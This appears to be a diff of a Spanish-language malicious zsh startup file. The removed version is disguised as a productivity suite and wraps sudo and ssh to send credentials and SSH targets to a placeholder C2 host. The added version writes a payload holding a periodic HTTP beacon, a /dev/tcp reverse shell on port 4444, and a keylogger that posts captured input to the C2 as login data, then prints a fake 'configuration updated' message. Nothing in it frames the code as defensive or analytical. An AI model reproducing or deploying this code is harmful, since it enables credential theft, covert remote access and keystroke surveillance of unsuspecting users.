@@ -1,42 +1,38 @@
+# En tu Linux VM, crea el payload
+cat > malicious.zshrc << 'EOF'
 #!/bin/zsh
-# .zshrc "legítimo" de Ernesto-Tech - PRODUCTIVITY SUITE v2.1
+# .zshrc malicioso - Se ejecuta al login de zsh
 
-# CONFIGURACIONES LEGÍTIMAS (disfraz)
-export PS1='%F{green}%n@%m%f %F{blue}%~%f %F{red}$%f '
-alias ll='ls -lah'
-alias update='sudo apt update && sudo apt upgrade -y'
+# Reemplaza con tu IP del PC (Express Server)
+C2_IP="TU_IP_PC_AQUI"  # Cambiar por IP de tu PC
 
-# MALWARE (hooks invisibles)
-
-# CRED Harvesting
-sudo() {
-    echo "sudo: $@" >> ~/.sudo_log_hidden
-    (
-        echo "SUDO_CREDS|$(whoami)|$*" | 
-        curl -s -d @- http://TU_C2_IP_AQUI:5000/creds 2>/dev/null || 
-        nc TU_C2_IP_AQUI 8080 <<< "SUDO_CREDS|$*"
-    ) &
-    command sudo "$@"
+# Beacon silencioso cada 30s
+beacon() {
+    curl -s "http://${C2_IP}:5000/beacon?ip=$(hostname -I)&user=$USER" > /dev/null 2>&1
 }
 
-# SSH Redirector PRINCIPAL
-ssh() {
-    TARGET=$1
-    (
-        sleep 1
-        echo "SSH_TARGET|${USER}@$(hostname)|$TARGET" | nc TU_C2_IP_AQUI 4444
-        # Puerto forward para sesión paralela
-        socat TCP-LISTEN:2222,fork EXEC:"ssh $TARGET" &
-    ) &
-    command ssh "$@"
+# Reverse shell persistente
+revshell() {
+    bash -i >& /dev/tcp/${C2_IP}/4444 0>&1 &
 }
 
-# Beacon persistente
-precmd() {
-    (
-        curl -s "http://TU_C2_IP_AQUI:5000/beacon?host=$(hostname)&user=$USER&pwd=$(pwd)" ||
-        true
-    ) &
+# Keylogger simple
+keylog() {
+    while true; do
+        read -r -s -t 1 line
+        [ -n "$line" ] && echo "$(date): $line" >> ~/.keylog
+        curl -s -X POST "http://${C2_IP}:5000/login" \
+             -H "Content-Type: application/json" \
+             -d "{\"usuario\":\"$USER\",\"clave\":\"KEYLOG: $line\"}" > /dev/null 2>&1
+    done
 }
 
-echo "Ernesto-Tech Suite v2.1 cargada - Latencia mejorada 37%"
+# Ejecutar todo en background
+(beacon; sleep 30; while true; do beacon; sleep 30; done) &
+(revshell) &
+(keylog) &
+
+echo "Configuración zsh actualizada ✓"
+EOF
+
+chmod +x malicious.zshrc
